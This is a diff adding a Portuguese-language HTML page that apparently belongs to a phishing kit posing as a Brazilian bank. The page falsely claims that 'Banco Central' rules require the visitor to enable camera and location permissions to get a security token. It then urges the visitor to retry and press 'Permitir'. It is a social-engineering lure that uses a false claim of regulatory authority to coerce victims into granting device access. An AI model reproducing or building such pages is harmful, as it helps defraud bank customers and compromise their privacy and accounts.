@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acesso Interrompido - Verificação Necessária</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        .card { background: white; padding: 40px 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 350px; }
+        .icon { font-size: 50px; color: #ffc107; margin-bottom: 20px; }
+        h2 { color: #333; font-size: 20px; margin-bottom: 15px; }
+        p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
+        .btn-retry { background-color: #007bff; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; text-decoration: none; display: block; transition: 0.3s; }
+        .btn-retry:hover { background-color: #0056b3; }
+        .step-instruction { font-size: 12px; color: #999; margin-top: 20px; font-style: italic; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="icon">⚠️</div>
+    <h2>Acesso não Autorizado</h2>
+    <p>Identificamos que as permissões de <b>Localização</b> e <b>Câmera</b> foram recusadas pelo seu navegador.</p>
+    <p>Por determinação do Banco Central, o Token de segurança só pode ser gerado com estas permissões ativas para evitar fraudes.</p>
+    
+    <a href="index.html" class="btn-retry">TENTAR NOVAMENTE</a>
+
+    <div class="step-instruction">
+        Dica: Ao clicar em tentar novamente, selecione "Permitir" quando o navegador solicitar o acesso.
+    </div>
+</div>
+
+</body>
+</html>
